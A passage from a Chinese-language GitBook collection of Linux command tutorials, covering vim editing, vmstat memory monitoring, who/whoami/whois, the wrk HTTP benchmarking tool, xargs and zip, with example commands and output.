多行添加5.2 多行删除5.3 移动多行6. 复制乱序Linux Command vim 文本编辑器 tagsstart 编辑器 tagsstop 1. 编辑多文件 1.1 在同一窗口中打开多个文件 vi file1 file2 file3 :n 切换到下一个文件 (n=next) :N 切换到上一个文件 1.2 在不同窗口中打开多个文件： 如果已经打开一个了一个文件， 则在vi的命令输入状态下输入 :sp 另外一个文件的路径及文件名， 如此就可以在一个窗口打开多个文件了。 或者用 vi -o file1 file2 file3....用分割屏幕窗口方式同时打开多个文件。 可以使用 ctrl + 两次按 w 或者ctrl + w 然后按上下键在上下窗口间切换。 1.3 窗口分割实现编辑多文件 先使用vi打开一个文件，例如vi actinia_proenrule.sh 分割窗口打开另外的文件 命令行模式下输入 sp 另外一个文件 就可以水平分割继续打开第二个文件，如果想纵向分割，可以使用vsp 文件名 注：sp=split，vsp=vsplit. 上面的写法是vi支持的简略写法，v实际就是vertical，从中我们可以看出改命令的含义，另外vi不仅仅支持两个文件，还支持更多个文件同时在一个 大的窗口中显示编辑，同时还支持同时打开的两个文件是同一个文件。 *窗口切换 可以使用 ctrl +两次按 w，这样就可以在各个文件中切换 之前觉得vi的多文档编辑用着很不方便，现在接触了几个，用过了MiniBufExplorer，发现看着不是很舒服。还是使用ｌｓ比较好看一些。 　 　 :ls 展示全部的打开文档 :xn 切换到向下的第x个文档 n ctrl+6 ： 切换到第n个buffer ctrl+6 或 :e# 回到前一个编辑文件 　　 分屏 :new xxx 　　ctrl+w s 对当前文档内容分屏显示 　　ctrl+w q 关闭所处分屏 　　ctrl+w o 仅显示当前分屏内容 　　ctrl+w j k 上下选择分屏 个人觉得最值得用的命令就是ctrl+w w 快速在分屏的两个屏幕中切换 下面写的还没用过~看了大家的分享觉得这几个还不错 :n1,n2 co n3: 将n1行到n2行之间的内容拷贝到第n3行下 :n1,n2 m n3:将n1行到n2行之间的内容移至到第n3行下 :n1,n2 d: 将 n1行到n2行之间的内容删除 :n1,n2 w!command: 将文件中n1行至n2行的内容作为command的输入并执行之， 若不指定n1，n2，则表示将整个文件内容作为command的输入 方式2的优点在可以直接使用nyy和pp命令在各个窗口的文件之间进行拷贝和粘贴，操作比较方便 2. 编辑命令 2.1 vim模式： 编辑模式(命令模式) 输入模式 末行模式 模式转换： 编辑-->输入： i: 在当前光标所在字符的前面，转为输入模式； a: 在当前光标所在字符的后面，转为输入模式； o: 在当前光标所在行的下方，新建一行，并转为输入模式； I：在当前光标所在行的行首，转换为输入模式 A：在当前光标所在行的行尾，转换为输入模式 O：在当前光标所在行的上方，新建一行，并转为输入模式； 输入-->编辑： ESC 编辑-->末行： : 末行-->编辑： ESC, ESC 注 ：输入模式和末行模式之间不能直接切换 2.2 打开文件 vim +\\# :打开文件，并定位于第#行 vim +：打开文件，定位至最后一行 vim +/PATTERN : 打开文件，定位至第一次被PATTERN匹配到的行的行首 注：默认处于编辑模式 2.3 关闭文件 2.3.1 末行模式关闭文件 :q 退出 :wq 保存并退出 :q! 不保存并退出 :w 保存 :w! 强行保存 :wq --> :x 2.3.2 编辑模式下退出 ZZ: 保存并退出 2.4 移动光标(编辑模式) 2.4.1 逐字符移动： h: 左 l: 右 j: 下 k: 上 #h: 移动#个字符 2.4.2 以单词为单位移动 w: 移至下一个单词的词首 e: 跳至当前或下一个单词的词尾 b: 跳至当前或前一个单词的词首 #w: 移动#个单词 2.4.3 行内跳转： 0: 绝对行首 ^: 行首的第一个非空白字符 $: 绝对行尾 2.4.4 行间跳转 #G：跳转至第#行 gg: 第一行 G：最后一行 2.4.5 末行模式 .: 表示当前行 $: 最后一行 #：第#行 +#: 向下的#行 2.5 翻屏 Ctrl+f: 向下翻一屏 Ctrl+b: 向上翻一屏 Ctrl+d: 向下翻半屏 Ctrl+u: 向上翻半屏 2.6 删除 2.6.1 删除单个字符 x: 删除光标所在处的单个字符 #x: 删除光标所在处及向后的共#个字符 2.6.2 删除命令: d d命令跟跳转命令组合使用 #dw, #de, #db dd: 删除当前光标所在行 #dd: 删除包括当前光标所在行在内的#行； 2.7 粘贴命令 p p: 如果删除或复制为整行内容，则粘贴至光标所在行的下方，如果复制或删除的内容为非整行，则粘贴至光标所在字符的后面 P: 如果删除或复制为整行内容，则粘贴至光标所在行的上方，如果复制或删除的内容为非整行，则粘贴至光标所在字符的前面 2.8 复制命令 y 用法同d命令 2.9 修改：先删除内容，再转换为输入模式 c: 用法同d命令 2.10 替换： r：单字符替换 #r: 光标后#个字符全部替换 R: 替换模式 2.11 撤消编辑操作 u u：撤消前一次的编辑操作 #u: 直接撤消最近#次编辑操作 连续u命令可撤消此前的n次编辑操作 撤消最近一次撤消操作：Ctrl+r 2.12 重复前一次编辑操作 .：编辑模式重复前一次编辑操作 2.13 可视化模式 v: 按字符选取 V：按矩形选取 2.14 查找 /PATTERN ?PATTERN n 下一个 N 上一个 2.15 查找并替换 在末行模式下使用s命令 headline,footlines#PATTERN#string#g 1,$:表示全文 %：表示全文 2.16 使用vim编辑多个文件 vim FILE1 FILE2 FILE3 :next 切换至下一个文件 :prev 切换至前一个文件 :last 切换至最后一个文件 :first 切换至第一个文件 :q退出当前文件 :qa 全部退出 2.17 分屏显示一个文件 Ctrl+w, s: 水平拆分窗口 Ctrl+w, v: 垂直拆分窗口 在窗口间切换光标： Ctrl+w, ARROW(h,j,k,l或方向键) :qa 关闭所有窗口 2.18 分窗口编辑多个文件 vim -o : 水平分割显示 vim -O : 垂直分割显示 2.19 将当前文件中部分内容另存为另外一个文件 末行模式下使用w命令 :ADDR1,ADDR2w /path/to/somewhere 2.20 将另外一个文件的内容填充在当前文件中 :r /path/to/somefile 附加到当前文件光标后 2.21 跟shell交互 :! COMMAND 2.22 快速翻页 整页翻页： ctrl-f - f就是forword ctrl-b - b就是backward 翻半页 ctrl-d d=down ctlr-u u=up 滚一行 ctrl-e ctrl-y zz 让光标所在的行居屏幕中央 zt 让光标所在的行居屏幕最上一行 t=top zb 让光标所在的行居屏幕最下一行 b=bottom 3 显示格式设置 3.1 显示或取消显示行号 :set nu :set nonu mu = number 3.2 显示忽略或区分字符大小写 :set ic :set noic ic = ignorecase 3.3 设定自动缩进 :set ai :set noai ai = autoindent 3.4 查找到的文本高亮显示或取消 :set hlsearch :set nohlsearch 3.5 语法高亮 :syntax on :syntax off 注:特性当前有效，如果想要永久有效需修改配置文件 4 配置文件 /etc/vimrc 针对所有用户 ~/.vimrc 针对当前用户 实例1 vi ~/.vimrc --- :set number :set et :set sw=2 ts=2 sts=2 --- ^: Start of word in line 0: Start of line $: End of line w: End of word GG: End of file 5 多行处理 5.1 多行添加 ctrl -v 选中多行 shift+i 添加# ESC 5.2 多行删除 Ctrl+v 左右移动 确定列数 上下移动确定行数 按下d 删除 5.3 移动多行 $ vim ~/.vimrc set shiftwidth=2 ##左右移动2行 在打开文件中 ctrl + v 可视化 上下移动确定移动行数 shift + > 向右移动2行 shift + 6. 复制乱序 set nopaste 参考： vim 教程 Getting started with Vim: The basics Getting Started with Vim Editor in Linux https://www.vim.org/ Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-07-27 08:04:34 "},"Linux-Command/Linux_Command_vmstat.html":{"url":"Linux-Command/Linux_Command_vmstat.html","title":"Linux Command Vmstat","keywords":"","body":"Linux Command vmstat 监控内存1. 简介2. 命令格式3. 命令参数4. 示例4.1 显示虚拟内存使用情况4.2 显示活跃和非活跃内存4.3 查看系统已经fork了多少次4.4 查看内存使用的详细信息4.5 查看磁盘的读/写4.6 查看/dev/sda1磁盘的读/写4.7 查看系统的slab信息Linux Command vmstat 监控内存 tagsstart 监控 分析 tagsstop 1. 简介 vmstat(VirtualMeomoryStatistics,虚拟内存统计) 是Linux中监控内存的常用工具,可对操作系统的虚拟内存、进程、CPU等的整体情况进行监视。 vmstat的常规用法：vmstat interval times即每隔interval秒采样一次，共采样times次，如果省略times,则一直采集数据，直到用户手动停止为止。 简单举个例子： [root@master ~]# vmstat 5 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 190476 1292 1281164 0 0 16 23 483 414 4 5 91 0 0 0 0 0 190608 1292 1281240 0 0 0 0 903 1622 2 4 94 0 0 3 0 0 190196 1292 1281264 0 0 0 5 948 1689 3 4 93 0 0 可以使用ctrl+c停止vmstat采集数据。 第一行显示了系统自启动以来的平均值，第二行开始显示现在正在发生的情况，接下来的行会显示每5秒间隔发生了什么，每一列的含义在头部，如下所示： procs：r这一列显示了多少进程在等待cpu，b列显示多少进程正在不可中断的休眠（等待IO）。 memory：swapd列显示了多少块被换出了磁盘（页面交换），剩下的列显示了多少块是空闲的（未被使用），多少块正在被用作缓冲区，以及多少正在被用作操作系统的缓存。 swap：显示交换活动：每秒有多少块正在被换入（从磁盘）和换出（到磁盘）。 io：显示了多少块从块设备读取（bi）和写出（bo）,通常反映了硬盘I/O。 system：显示每秒中断(in)和上下文切换（cs）的数量。 cpu：显示所有的cpu时间花费在各类操作的百分比，包括执行用户代码（非内核），执行系统代码（内核），空闲以及等待IO。 内存不足的表现：free memory急剧减少，回收buffer和cacher也无济于事，大量使用交换分区（swpd）,页面交换（swap）频繁，读写磁盘数量（io）增多，缺页中断（in）增多，上下文切换（cs）次数增多，等待IO的进程数（b）增多，大量CPU时间用于等待IO（wa） vmstat r, b, si, so, bi, bo 这几列表示什么含义呢？ 答： [root@centos6 ~ 10:57 #39]# vmstat procs -----------memory---------- ---swap-- -----io---- --system-- -----cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 0 0 0 1783964 13172 106056 0 0 29 7 15 11 0 0 99 0 0 r即running，表示正在跑的任务数 b即blocked，表示被阻塞的任务数 si表示有多少数据从交换分区读入内存 so表示有多少数据从内存写入交换分区 bi表示有多少数据从磁盘读入内存 bo表示有多少数据从内存写入磁盘 简记： i --input，进入内存 o --output，从内存出去 s --swap，交换分区 b --block，块设备，磁盘 单位都是KB 2. 命令格式 vmstat [-a] [-n] [-S unit] [delay [ count]] vmstat [-s] [-n] [-S unit] vmstat [-m] [-n] [delay [ count]] vmstat [-d] [-n] [delay [ count]] vmstat [-p disk partition] [-n] [delay [ count]] vmstat [-f] vmstat [-V] 3. 命令参数 -a：显示活跃和非活跃内存 -f：显示从系统启动至今的fork数量 。 -m：显示slabinfo -n：只在开始时显示一次各字段名称。 -s：显示内存相关统计信息及多种系统活动数量。 delay：刷新时间间隔。如果不指定，只显示一条结果。 count：刷新次数。如果不指定刷新次数，但指定了刷新时间间隔，这时刷新次数为无穷。 -d：显示磁盘相关统计信息。 -p：显示指定磁盘分区统计信息 -S：使用指定单位显示。参数有 k 、K 、m 、M ，分别代表1000、1024、1000000、1048576字节（byte）。默认单位为K（1024 bytes） -V：显示vmstat版本信息。 4. 示例 4.1 显示虚拟内存使用情况 vmstat 5 6 #表示在5秒时间内进行6次采样。将得到一个数据汇总他能够反映真正的系统情况 [root@master ~]# vmstat 5 6 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free buff cache si so bi bo in cs us sy id wa st 1 0 0 171568 1292 1289680 0 0 15 23 484 421 4 5 91 0 0 1 0 0 171584 1292 1289724 0 0 0 2 888 1670 3 4 94 0 0 0 0 0 170508 1292 1289892 0 0 0 14 940 1753 2 4 94 0 0 5 0 0 170588 1292 1289936 0 0 0 49 919 1717 2 3 95 0 0 1 0 0 170588 1292 1289976 0 0 0 22 948 1708 2 4 93 0 0 0 0 0 170508 1292 1290016 0 0 0 16 1026 1794 3 4 92 0 0 4.2 显示活跃和非活跃内存 [root@master ~]# vmstat -a 2 5 procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu----- r b swpd free inact active si so bi bo in cs us sy id wa st 1 0 0 181852 355052 892856 0 0 15 23 484 422 4 5 91 0 0 4 0 0 166352 355092 904644 0 0 0 110 1516 2867 9 12 79 0 0 2 0 0 153920 355072 916868 0 0 0 141 1292 2203 9 5 87 0 0 1 0 0 156708 355080 915332 0 0 0 0 1230 2145 4 7 89 0 0 1 0 0 156620 355072 915432 0 0 0 51 1104 2001 3 5 92 0 0 4.3 查看系统已经fork了多少次 vmstat -f #这个数据是从/proc/stat中的processes字段里取得的 [root@master ~]# vmstat -f 338852 forks 4.4 查看内存使用的详细信息 vmstat -s #这些信息的分别来自于/proc/meminfo,/proc/stat和/proc/vmstat [root@master ~]# vmstat -f 338852 forks [root@master ~]# vmstat -s 1863252 K total memory 417256 K used memory 918768 K active memory 355072 K inactive memory 152384 K free memory 1292 K buffer memory 1292320 K swap cache 0 K total swap 0 K used swap 0 K free swap 310918 non-nice user cpu ticks 4074 nice user cpu ticks 406501 system cpu ticks 7950034 idle cpu ticks 2466 IO-wait cpu ticks 0 IRQ cpu ticks 37468 softirq cpu ticks 0 stolen cpu ticks 1328395 pages paged in 2002004 pages paged out 0 pages swapped in 0 pages swapped out 85085982 interrupts 208703640 CPU context switches 1623694269 boot time 339560 forks 4.5 查看磁盘的读/写 vmstat -d 这些信息主要来自于/proc/diskstats. merged:表示一次来自于合并的写/读请求,一般系统会把多个连接/邻近的读/写请求合并到一起来操作 [root@master ~]# vmstat -d disk- ------------reads------------ ------------writes----------- -----IO------ total merged sectors ms total merged sectors ms cur sec sda 16740 4 2656790 43417 283286 9061 4006396 224355 0 124 sr0 0 0 0 0 0 0 0 0 0 0 dm-0 14435 0 2592710 42246 292337 0 4002259 246995 0 124 dm-1 86 0 4144 229 0 0 0 0 0 0 4.6 查看/dev/sda1磁盘的读/写 df -h vmstat -p /dev/sda1 这些信息主要来自于/proc/diskstats。 reads:来自于这个分区的读的次数。 read sectors:来自于这个分区的读扇区的次数。 writes:来自于这个分区的写的次数。 requested writes:来自于这个分区的写请求次数。 [root@master ~]# vmstat -p /dev/sda1 sda1 reads read sectors writes requested writes 2115 52608 10 4137 4.7 查看系统的slab信息 vmstat -m 这组信息来自于/proc/slabinfo。 slab:由于内核会有许多小对象，这些对象构造销毁十分频繁， 比如i-node，dentry，这些对象如果每次构建的时候就向内存要一个页(4kb)， 而其实只有几个字节，这样就会非常浪费，为了解决这个问题，就引入了一种新的机制来处理在同一个页框中如何分配小存储区， 而slab可以对小对象进行分配,这样就不用为每一个对象分配页框，从而节省了空间，内核对一些小对象创建析构很频繁， slab对这些小对象进行缓冲,可以重复利用,减少内存分配次数。 [root@master ~]# vmstat -m Cache Num Total Size Pages nf_conntrack_ffff9b1ef89e2900 765 765 320 51 nf_conntrack_ffff9b1ef89e1480 612 612 320 51 nf_conntrack_ffffffff87511640 1275 21369 320 51 ovl_inode 3984 41232 680 48 rpc_inode_cache 51 51 640 51 xfs_dqtrx 0 0 528 62 xfs_dquot 0 0 488 67 xfs_ili 3552 22752 168 48 xfs_inode 8126 23052 960 34 xfs_efd_item 468 2652 416 39 xfs_log_ticket 352 352 184 44 bio-3 204 204 320 51 kcopyd_job 0 0 3312 9 dm_uevent 0 0 2608 12 dm_rq_target_io 0 0 136 60 ip6_dst_cache 648 648 448 36 RAWv6 572 572 1216 26 UDPLITEv6 0 0 1216 26 UDPv6 104 104 1216 26 tw_sock_TCPv6 128 128 256 64 TCPv6 180 180 2112 15 Cache Num Total Size Pages cfq_queue 0 0 232 70 bsg_cmd 0 0 312 52 mqueue_inode_cache 72 72 896 36 hugetlbfs_inode_cache 106 106 608 53 configfs_dir_cache 0 0 88 46 dquot 0 0 256 64 kioctx 56 56 576 56 userfaultfd_ctx_cache 0 0 192 42 pid_namespace 28 28 2200 14 posix_timers_cache 264 7920 248 66 UDP-Lite 0 0 1088 30 flow_cache 0 0 144 56 UDP 180 180 1088 30 tw_sock_TCP 384 576 256 64 TCP 336 2112 1984 16 dax_cache 84 84 768 42 blkdev_queue 39 39 2456 13 blkdev_ioc 663 663 104 39 user_namespace 136 136 480 68 sock_inode_cache 3570 3570 640 51 fsnotify_mark_connector 680 680 24 170 Cache Num Total Size Pages net_namespace 12 12 5248 6 shmem_inode_cache 3170 13248 680 48 Acpi-State 510 510 80 51 task_delay_info 2124 2124 112 36 taskstats 147 147 328 49 proc_inode_cache 3599 4067 656 49 sigqueue 102 102 160 51 bdev_cache 78 78 832 39 kernfs_node_cache 192916 192916 120 68 mnt_cache 3324 8652 384 42 inode_cache 27938 27995 592 55 dentry 59658 124110 192 42 iint_cache 0 0 128 64 avc_xperms_node 1462 1533 56 73 avc_node 8400 8400 72 56 selinux_inode_security 21828 22542 40 102 buffer_head 47395 61815 104 39 vm_area_struct 7655 8399 216 37 mm_struct 664 900 1600 20 files_cache 1785 1785 640 51 signal_cache 910 1008 1152 28 Cache Num Total Size Pages sighand_cache 623 660 2112 15 task_xstate 1516 1530 1088 30 task_struct 790 826 4160 7 anon_vma 4336 5049 80 51 shared_policy_node 3061 3145 48 85 numa_policy 186 186 264 62 radix_tree_node 7501 15400 584 56 idr_layer_cache 660 660 2112 15 dma-kmalloc-8192 0 0 8192 4 dma-kmalloc-4096 0 0 4096 8 dma-kmalloc-2048 0 0 2048 16 dma-kmalloc-1024 0 0 1024 32 dma-kmalloc-512 64 64 512 64 dma-kmalloc-256 0 0 256 64 dma-kmalloc-128 0 0 128 64 dma-kmalloc-64 0 0 64 64 dma-kmalloc-32 0 0 32 128 dma-kmalloc-16 0 0 16 256 dma-kmalloc-8 0 0 8 512 dma-kmalloc-192 0 0 192 42 dma-kmalloc-96 0 0 96 42 Cache Num Total Size Pages kmalloc-8192 80 80 8192 4 kmalloc-4096 1051 1080 4096 8 kmalloc-2048 18183 19136 2048 16 kmalloc-1024 6359 21184 1024 32 kmalloc-512 25749 68800 512 64 kmalloc-256 28071 39040 256 64 kmalloc-192 30717 57120 192 42 kmalloc-128 17497 39744 128 64 kmalloc-96 45512 64722 96 42 kmalloc-64 39073 114368 64 64 kmalloc-32 8994 88064 32 128 kmalloc-16 19200 19200 16 256 kmalloc-8 20992 20992 8 512 kmem_cache_node 5056 5056 64 64 kmem_cache 4992 4992 256 64 参考： vmstat(8) — Linux manual page Linux commands: exploring virtual memory with vmstat vmstat command in Linux with Examples Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:15:46 "},"Linux-Command/Linux_Command_who.html":{"url":"Linux-Command/Linux_Command_who.html","title":"Linux Command Who","keywords":"","body":"Linux Command who、whois、whoami1. whois2. who whoami 和 who am iLinux Command who、whois、whoami tagsstart 用户管理 tagsstop 1. whois 显示指定用户信息 $ whois root　#显示指定用户信息 $ whois ywnz.com　#查询域名描述信息 $ whois ywnz.com　#查询域名信息 $ whois -H ywnz.com　#查询域名信息省略法律声明 $ whois -p 80 ywnz.com　#指定端口查询 2. who whoami 和 who am i whoami；显示的是当前用户下的用户名 who am i：显示的是登录时的用户名 who：显示当前真正登录系统中的用户（不会显示那些用su命令切换用户的登录者） [root@kz1 ~]# who root pts/0 2020-03-16 21:56 (172.6.185.228) [root@kz1 ~]# whoami root [root@kz1 ~]# who am i root pts/0 2020-03-16 21:56 (172.6.185.228) [root@kz1 ~]# useradd test1 [root@kz1 ~]# su - test1 [test1@kz1 ~]$ who root pts/0 2020-03-16 21:56 (172.6.185.228) [test1@kz1 ~]$ whoami test1 [test1@kz1 ~]$ who am i root pts/0 2020-03-16 21:56 (172.6.185.228) Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 16:20:38 "},"Linux-Command/Linux_Command_wrk.html":{"url":"Linux-Command/Linux_Command_wrk.html","title":"Linux Command Wrk","keywords":"","body":"Linux Commnad wrk HTTP 性能测试工具1. 简介2. 安装3. 参数4. 用法Linux Commnad wrk HTTP 性能测试工具 tagsstart 测试 tagsstop 1. 简介 wrk是一个 HTTP 性能测试工具，内置了 LuaJIT，方便你根据实际需求，生成所需的请求负载，或者自定义响应的处理方法。 github:https://github.com/wg/wrk 2. 安装 git clone https://github.com/wg/wrk cd wrk apt-get install build-essential -y make sudo cp wrk /usr/local/bin/ #常用方法 wrk -t12 -c400 -d30s http://127.0.0.1:8080/index.html 3. 参数 Options: -c, --connections 跟服务器建立并保持的TCP连接数量 -d, --duration 压测时间 -t, --threads 使用多少个线程进行压测，压测时，是有一个主线程来控制我们设置的n个子线程间调度 -s, --script 指定Lua脚本路径 -H, --header 为每一个HTTP请求添加HTTP头 --latency 在压测结束后，打印延迟统计信息 --timeout 超时时间 -v, --version 打印正在使用的wrk的详细版本信 代表数字参数，支持国际单位 (1k, 1M, 1G) 代表时间参数，支持时间单位 (2s, 2m, 2h) 4. 用法 以上是使用8个线程200个连接，对bing首页进行了30秒的压测，并要求在压测结果中输出响应延迟信息。 root@test1:~/wrk# wrk -t8 -c200 -d30s --latency http://www.bing.com Running 30s test @ http://www.bing.com （压测时间30s） 8 threads and 200 connections （共8个测试线程，200个连接） Thread Stats Avg Stdev Max +/- Stdev （平均值） （标准差）（最大值）（正负一个标准差所占比例） Latency 46.67ms 215.38ms 1.67s 95.59% （延迟） Req/Sec 7.91k 1.15k 10.26k 70.77% （处理中的请求数） Latency Distribution （延迟分布） 50% 2.93ms 75% 3.78ms 90% 4.73ms 99% 1.35s （99分位的延迟：%99的请求在1.35s以内） 1790465 requests in 30.01s, 684.08MB read （30.01秒内共处理完成了1790465个请求，读取了684.08MB数据） Requests/sec: 59658.29 （平均每秒处理完成59658.29个请求） Transfer/sec: 22.79MB （平均每秒读取数据22.79MB） # 测试8080端口性能 $ wrk --latency -c 100 -t 2 --timeout 2 http://192.168.0.30:8080/ Running 10s test @ http://192.168.0.30:8080/ 2 threads and 100 connections Thread Stats Avg Stdev Max +/- Stdev Latency 43.60ms 6.41ms 56.58ms 97.06% Req/Sec 1.15k 120.29 1.92k 88.50% Latency Distribution 50% 44.02ms 75% 44.33ms 90% 47.62ms 99% 48.88ms 22853 requests in 10.01s, 18.55MB read Requests/sec: 2283.31 Transfer/sec: 1.85MB 参考链接 wrk性能测试（详解） https://github.com/wg/wrk Intelligent benchmark with wrk Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 14:40:01 "},"Linux-Command/Linux_Command_xargs.html":{"url":"Linux-Command/Linux_Command_xargs.html","title":"Linux Command Xargs","keywords":"","body":"Linux Command xargs文件管理,shell1. 简介2. 格式3. 单独使用4. -d 自定义定界符5. -p 询问执行6. -t 立即执行7. -I 替换字符串8. -L9. -n 分列10. xargs 结合 find 使用11. xargs 其他应用Linux Command xargs 文件管理,shell 1. 简介 xargs命令是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。 它擅长将标准输入数据转换成命令行参数，xargs能够处理管道或者stdin并将其转换成特定命令的命令参数。 xargs也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。 xargs的默认命令是echo，空格是默认定界符。这意味着通过管道传递给xargs的输入将会包含换行和空白， 通过xargs的处理，换行和空白将被空格取代。xargs是构建单行命令的重要组件之一。 xargs命令的作用，是将标准输入转为命令行参数。 $ echo \"hello world\" | xargs echo hello world hello world hello world 2. 格式 $ xargs [-options] [command] xargs的作用在于，大多数命令（比如rm、mkdir、ls）与管道一起使用时，都需要xargs将标准输入转为命令行参数。 #1. 创建多文件 $ echo \"one two three\" | xargs mkdir $ ls one two three $ cat foo.txt one two three #2. 创建多文件 $ cat foo.txt | xargs -I % sh -c 'echo %; mkdir %' one two three $ ls one two three 上面的代码等同于mkdir one two three。如果不加xargs就会报错，提示mkdir缺少操作参数。 3. 单独使用 $ echo \"a\\nb\\nc\\nd\" a\\nb\\nc\\nd $ echo \"a\\nb\\nc\\nd\" | xargs anbncnd $ echo -e \"a\\nb\\nc\\nd\" a b c d $ echo -e \"a\\nb\\nc\\nd\" | xargs a b c d $ cat test.txt a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs a b c d e f g h i j k l m n o p q r s t u v w x y z 4. -d 自定义定界符 $ echo \"nameXnameXnameXname\" | xargs -dX name name name name $ echo \"nameXnameXnameXname\" | xargs -dX -n2 name name name name $ echo -e \"a\\tb\\tc\" | xargs -d \"\\t\" a b c 5. -p 询问执行 -p参数打印出要执行的命令，询问用户是否要执行 $ echo 'one two three' | xargs -p touch touch one two three ?...y $ ls one two three 6. -t 立即执行 -t参数则是打印出最终要执行的命令，然后直接执行，不需要用户确认。 echo 'one two three' | xargs -t rm rm one two three 7. -I 替换字符串 xargs的一个选项-I，使用-I指定一个替换字符串{}，这个字符串在xargs扩展时会被替换掉，当-I与xargs结合使用，每一个参数命令都会被执行一次： $ cat sk.sh #!/bin/bash echo $* $ cat arg.txt aaa bbb ccc $ cat arg.txt | xargs -I {} ./sk.sh -p {} -l -p aaa -l -p bbb -l -p ccc -l 复制所有图片文件到 /data/images 目录下： ls *.jpg | xargs -n1 -I cp {} /data/images 8. -L $ cat test.txt | xargs -L 1 a b c d e f g h i j k l m n o p q r s t u v w x y z [root@localhost shell]# cat test.txt | xargs -L 1 a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -L 2 a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -L 3 a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -L 4 a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -L 5 a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -L 6 a b c d e f g h i j k l m n o p q r s t u v w x y z 9. -n 分列 $ cat test.txt a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -n 1 a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -n 2 a b c d e f g h i j k l m n o p q r s t u v w x y z $ cat test.txt | xargs -n3 a b c d e f g h i j k l m n o p q r s t u v w x y z 快速关闭 Docker 容器 $ docker ps -q | xargs -n 1 --max-procs 0 docker kill --max-procs参数指定同时用多少个进程并行执行命令。 --max-procs 2表示同时最多使用两个进程 --max-procs 0表示不限制进程数。 xargs默认只用一个进程执行命令。如果命令要执行多次，必须等上一次执行完，才能执行下一次。 10. xargs 结合 find 使用 用rm 删除太多的文件时候，可能得到一个错误信息：/bin/rm Argument list too long.用xargs去避免这个问题： 由于xargs默认将空格作为分隔符，所以不太适合处理文件名，因为文件名可能包含空格。 find命令有一个特别的参数-print0，指定输出的文件列表以null分隔。然后，xargs命令的-0参数表示用null当作分隔符 $ find . -type f -name \"*.log\" -print0 | xargs -0 rm -f xargs -0将\\0作为定界符。 统计一个源代码目录中所有php文件的行数： find . -type f -name \"*.php\" -print0 | xargs -0 wc -l 查找所有的jpg 文件，并且压缩它们： find . -type f -name \"*.jpg\" -print | xargs tar -czvf images.tar.gz 与-exec相比，谁删除文件更快？当然xargs time find . -type f -name \"*.txt\" -exec rm {} \\; 0.35s user 0.11s system 99% cpu 0.467 total time find ./foo -type f -name \"*.txt\" | xargs rm 0.00s user 0.01s system 75% cpu 0.016 total 删除14分钟以前的文件 find /tmp -mtime +14 | xargs rm 11. xargs 其他应用 假如你有一个文件包含了很多你希望下载的URL，你能够使用xargs下载所有链接： cat url-list.txt | xargs wget -c grep abc在所有的txt文件中 $ find . -name \"*.txt\" | xargs grep \"abc\" 更多阅读： xargs(1) — Linux manual page How to Use the Linux xargs Command 图 1.2.96.1：在这里插入图片描述 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:43:57 "},"Linux-Command/Linux_Command_zip.html":{"url":"Linux-Command/Linux_Command_zip.html","title":"Linux Command Zip","keywords":"","body":"Linux Command zip 压缩1. 安装2. 格式3. 参数4. 举例Linux Command zip 压缩 tagsstart 压缩解压 tagsstop 1. 安装 $ yum -y install zip 2. 格式 zip [-AcdDfFghjJKlLmoqrSTuvVwXyz$][-b ][-ll][-n ][-t ][-][压 缩文件][文件...][-i ][-x ] 补充说明：zip是个使用广泛的压缩程序，文件经它压缩后会另外产生具 有\".zip\"扩展名 的压缩文件。 3. 参数 -A 调 整可执行的自动解压缩文件。 -b 指 定暂时存放文件的目录。 -c 替 每个被压缩的文件加上注释。 -d 从 压缩文件内删除指定的文件。 -D 压 缩文件内不建立目录名称。 -f 此 参数的效果和指定\"-u\"参 数类似，但不仅更新既有文件，如果某些文件原本不存在于压缩文件内，使用本参数会一并将其加入压缩文件中。 -F 尝 试修复已损坏的压缩文件。 -g 将 文件压缩后附加在既有的压缩文件之后，而非另行建立新的压缩文件。 -h 在 线帮助。 -i 只 压缩符合条件的文件。 -j 只 保存文件名称及其内容，而不存放任何目录名称。 -J 删 除压缩文件前面不必要的数据。 -k 使 用MS-DOS兼容格 式的文件名称。 -l 压 缩文件时，把LF字符 置换成LF+CR字 符。 -ll 压 缩文件时，把LF+CR字 符置换成LF字符。 -L 显 示版权信息。 -m 将 文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中。 -n 不 压缩具有特定字尾字符串的文件。 -o 以 压缩文件内拥有最新更改时间的文件为准，将压缩文件的更改时间设成和该文件相同。 -q 不显 示指令执行过程。 -r 递 归处理，将指定目录下的所有文件和子目录一并处理。 -S 包 含系统和隐藏文件。 -t 把 压缩文件的日期设成指定的日期。 -T 检 查备份文件内的每个文件是否正确无误。 -u 更 换较新的文件到压缩文件内。 -v 显 示指令执行过程或显示版本信息。 -V 保 存VMS操作系统的文 件属性。 -w 在 文件名称里假如版本编号，本参数仅在VMS操 作系统下有效。 -x 压 缩时排除符合条件的文件。 -X 不 保存额外的文件属性。 -y 直 接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之 类的系统下有效。 -z 替 压缩文件加上注释。 -$ 保 存第一个被压缩文件所在磁盘的卷册名称。 - 压 缩效率是一个介于1-9的 数值。 4. 举例 -d -g -u [root@localhost dir1]$ ls 1.txt 